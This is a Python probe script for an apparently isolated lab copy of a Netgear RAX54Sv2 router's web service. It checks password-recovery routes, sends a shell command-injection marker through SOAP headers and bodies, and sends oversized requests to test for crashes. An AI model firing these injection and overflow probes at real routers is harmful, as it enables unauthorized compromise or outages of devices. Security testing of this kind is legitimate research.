#!/usr/bin/env python3
"""Bounded loopback-only probes for the isolated RAX54Sv2 HTTP lab."""

from __future__ import annotations

import argparse
import socket
import ssl
import time


USE_TLS = False


def exchange(host: str, port: int, payload: bytes, timeout: float = 4) -> bytes:
    response = bytearray()
    raw = socket.create_connection((host, port), timeout=timeout)
    if USE_TLS:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        client = context.wrap_socket(raw, server_hostname="routerlogin.net")
    else:
        client = raw
    with client:
        client.sendall(payload)
        if not USE_TLS:
            client.shutdown(socket.SHUT_WR)
        while chunk := client.recv(65536):
            response.extend(chunk)
    return bytes(response)


def request(
    method: str,
    path: str,
    body: bytes = b"",
    headers: tuple[tuple[str, str], ...] = (),
) -> bytes:
    fields = (
        ("Host", "routerlogin.net"),
        *headers,
        ("Content-Length", str(len(body))),
        ("Connection", "close"),
    )
    return (
        f"{method} {path} HTTP/1.1\r\n".encode()
        + b"".join(f"{name}: {value}\r\n".encode() for name, value in fields)
        + b"\r\n"
        + body
    )


def status(response: bytes) -> str:
    return response.splitlines()[0].decode(errors="replace") if response else "no response"


def alive(host: str, port: int) -> bool:
    try:
        return status(exchange(host, port, request("GET", "/"))).startswith("HTTP/")
    except OSError:
        return False


def run_case(host: str, port: int, name: str, payload: bytes) -> bool:
    try:
        result = status(exchange(host, port, payload))
    except OSError as error:
        result = f"{type(error).__name__}: {error}"
    time.sleep(1)
    healthy = alive(host, port)
    print(f"{name}: response={result!r} service_alive={str(healthy).lower()}")
    return healthy


def auth_map(host: str, port: int) -> int:
    routes = (
        "/",
        "/index.htm",
        "/unauth.cgi",
        "/passwordrecovered.cgi",
        "/passwordrecovered_debug",
        "/passwordrecovered_debug2",
        "/upgrade_check.cgi",
        "/soap/server_sa/",
    )
    for route in routes:
        if not run_case(host, port, f"GET-{route}", request("GET", route)):
            return 2
    return 0


def soap(host: str, port: int) -> int:
    namespace = "urn:NETGEAR-ROUTER:service:DeviceInfo:1"
    marker = "$(touch${IFS}/tmp/FRIDAY_RAX54SV2_HTTP_RCE_MARKER)"
    cases = (
        (
            "soap-control",
            "GetInfo",
            f'<m:GetInfo xmlns:m="{namespace}"/>',
        ),
        (
            "soapaction-command-marker",
            f"GetInfo;{marker}",
            f'<m:GetInfo xmlns:m="{namespace}"/>',
        ),
        (
            "soap-body-command-marker",
            "GetInfo",
            f'<m:GetInfo xmlns:m="{namespace}"><NewValue>{marker}</NewValue></m:GetInfo>',
        ),
    )
    for name, action, content in cases:
        body = (
            '<?xml version="1.0"?>'
            '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
            f"<s:Body>{content}</s:Body></s:Envelope>"
        ).encode()
        payload = request(
            "POST",
            "/soap/server_sa/",
            body,
            (
                ("Content-Type", 'text/xml; charset="utf-8"'),
                ("SOAPAction", f'"{namespace}#{action}"'),
            ),
        )
        if not run_case(host, port, name, payload):
            return 2
    return 0


def parser(host: str, port: int) -> int:
    cases = (
        ("uri-1024", request("GET", "/" + "A" * 1024)),
        ("uri-4096", request("GET", "/" + "A" * 4096)),
        (
            "header-value-1024",
            request("GET", "/", headers=(("X-Friday", "B" * 1024),)),
        ),
        (
            "header-value-4096",
            request("GET", "/", headers=(("X-Friday", "B" * 4096),)),
        ),
        (
            "soap-body-64k",
            request(
                "POST",
                "/soap/server_sa/",
                b"<s:Envelope>" + b"C" * 65536 + b"</s:Envelope>",
                (("Content-Type", "text/xml"),),
            ),
        ),
    )
    for name, payload in cases:
        if not run_case(host, port, name, payload):
            return 2
    return 0


def soap_stress(host: str, port: int) -> int:
    namespace = "urn:NETGEAR-ROUTER:service:DeviceConfig:1"
    for size in (0x3FFF, 0xFFFF, 0x3FFFF, 0x40000, 0x40001, 0x80000):
        filler = "D" * size
        body = (
            '<?xml version="1.0"?>'
            '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
            f'<s:Body><m:ResetAdminPassword xmlns:m="{namespace}">'
            f"<Friday>{filler}</Friday>"
            "</m:ResetAdminPassword></s:Body></s:Envelope>"
        ).encode()
        payload = request(
            "POST",
            "/soap/server_sa/",
            body,
            (
                ("Content-Type", 'text/xml; charset="utf-8"'),
                ("SOAPAction", f'"{namespace}#ResetAdminPassword"'),
            ),
        )
        if not run_case(host, port, f"reset-body-{size}", payload):
            return 2
    return 0


def main() -> int:
    global USE_TLS
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=25082)
    parser.add_argument("--tls", action="store_true")
    parser.add_argument(
        "--mode", choices=("auth-map", "soap", "parser", "soap-stress"), required=True
    )
    args = parser.parse_args()
    USE_TLS = args.tls
    print(f"baseline_before={'pass' if alive(args.host, args.port) else 'fail'}")
    result = {
        "auth-map": auth_map,
        "soap": soap,
        "parser": globals()["parser"],
        "soap-stress": soap_stress,
    }[args.mode](args.host, args.port)
    print(f"baseline_after={'pass' if alive(args.host, args.port) else 'fail'}")
    return result


if __name__ == "__main__":
    raise SystemExit(main())
